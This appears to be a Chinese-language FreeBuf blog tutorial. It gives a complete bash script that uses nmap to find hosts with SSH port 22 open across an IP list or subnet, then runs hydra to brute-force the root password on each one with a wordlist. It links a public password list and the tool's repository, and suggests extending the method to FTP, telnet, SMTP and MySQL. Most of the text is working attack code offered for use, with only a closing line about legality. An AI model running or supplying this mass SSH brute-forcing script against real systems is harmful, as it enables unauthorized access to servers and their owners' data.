## **前言**

**SSH登录密码的破解工具已然有许多，但偶尔还是存在不能满足任务需求的情况。比如，批量地对IP列表里的IP地址进行SSH登录破解，现有的工具直接使用起来总觉得不方便。那么，能否利用现有的工具，来定制打造适合自己的装备？当然可以，而且，这是想要偷懒的宝宝们需要掌握的一项技能。**

##  **正文**

批量爆破SSH登录密码的流程其实很简单。首先探测对方主机是否开启22端口，如开启，则尝试进行SSH密码爆破。这里用到两款强大的开源工具。一个是nmap，用来探测22端口是否开启；另一个是hydra，用来爆破SSH登录密码。这两款工具我不做过多的介绍，它们的强大，Google一下，自有体会。那么如何将这两款工具结合到一起使用，笔者这里通过选用的是灵活的shell脚本。

![image.png](https://image.3001.net/images/20180504/15254430549482.png!small)

如上图所示，过程分为两步，首先用nmap批量地扫描开放22端口的公网上的设备，运行命令如下：

    
    
    nmap -vv -n –sS -sU -p22 -iL ./iplist.txt  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt   

这条命令的含义是，扫描iplist.txt文件中的IP地址是否开启22端口；如开启，则将这个结果输出到22-output.txt文件中。这条命令还可以这样写：

    
    
    nmap -vv -n –sS -sU -p22 192.168.1.0/24  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt 

这是对一个网段的扫描，也可以换成一个IP。-sS和-sU都是扫描策略的选项，两个一起使用，可以提高扫描的可靠性。在实际测试过程中（内网环境），nmap还是存在漏扫的情况，想要提高它的准确率，还需自己不断尝试，不断调整扫描策略才会有感觉。

第二步为，读取22-output.txt文件中开放22端口的主机，使用hydra工具进行密码爆破，使用的命令如下：

    
    
    hydra -l root -P ./password.txt -t 6 -vV 192.168.0.12 ssh | grep "host:"

这条命令的含义是采用密码本./password.txt中的密码，对IP地址为：192.168.0.12的主机进行密码破解。grep
"host:"用来过滤打印的输出，只输出破解到密码的条目。由于hydra一次只能对一个IP进行破解，因此，在shell中写了一个循环，hydra一次任务结束后，立即进行下一个IP的破解，直到将22-output.txt文件中IP遍历完为止。代码如下所示。

    
    
    cat ./22-output.txt | while read line
    do 
        echo "Current Task: ${line}"
        hydra -l root -P $passfile -t 6 -vV $line ssh | grep "host:" 
    done

遍历代码很简单，不用惊讶，这就是shell脚本的神奇之处。主要步骤讲完后，下面来看看整个代码，看如何用shell程序将这些串起来。

    
    
    #!/bin/bash
    
    if [ $# -lt 4 ] 
    then
       echo "usage: ./hydra.sh -p ./password.txt -f ./iplist.txt"
       echo "usage: ./hydra.sh -p ./password.txt -l 192.168.9.0/24"
       exit 1
    fi
    
    while [ -n "$1" ]  
    do  
      case "$1" in    
        -p)  
            passfile=$2
            #echo $passfile 
            shift  
            ;;  
        -f)  
            nmap -vv -n -sS -sU -p22 -iL $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt
            shift  
            ;;  
        -l)  
            nmap -vv -n -sS -sU -p22 $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt 
            shift  
            ;; 
        *)  
            echo "$1 is not an option"  
            echo "usage: ./hydra.sh -p ./password.txt -f ./iplist.txt"
            echo "usage: ./hydra.sh -p ./password.txt -l 192.168.9.0/24"
            exit 1
            ;;  
      esac  
      shift  
    done
    
    echo "-----------port scan finished-----------"
    
    chmod 666 ./22-output.txt
    
    #echo `cat ./22-output.txt` 
    
    cat ./22-output.txt | while read line
    do 
        echo "Current Task: ${line}"
        hydra -l root -P $passfile -t 6 -vV $line ssh | grep "host:"
    done
    
    echo "-------password guessing finished-------"
    
    

这个程序做了一些参数传递的判断，核心代码行十分精简。在使用程序之前，需得在主机上安装nmap和hydra，Ubuntu下直接用apt安装。运行很方便，下面是运行图，在内网环境下破解了3台主机的密码：  

![22-pass.gif](https://image.3001.net/images/20180504/15254439958548.gif!small)

当然，能否破解成功，有一个好用的工具固然重要，但还需要一个强健的密码本。在为密码本烦恼的宝宝们，也不用担心，已经有人总结好最常用的密码条目。见这里[[传送门](https://github.com/danielmiessler/SecLists/tree/master/Passwords)]

工具传送门为：<https://github.com/scu-igroup/ssh-scanner>

##  **总结**

通过对该工具的介绍，聪明的你可以举一反三，改造成对任意服务的批量口令爆破（前提是只要hydra支持就行，包括：FTP，telnet，SMTP，POP3，MySQL等等）。下次有渗透测试地批量扫描任务，就可以一键搞定啦。
最后，提醒一句，公网上谨慎扫描，一切行为需合规合法。

 ***本文作者：scu-igroup，转载请注明来自FreeBuf.COM**

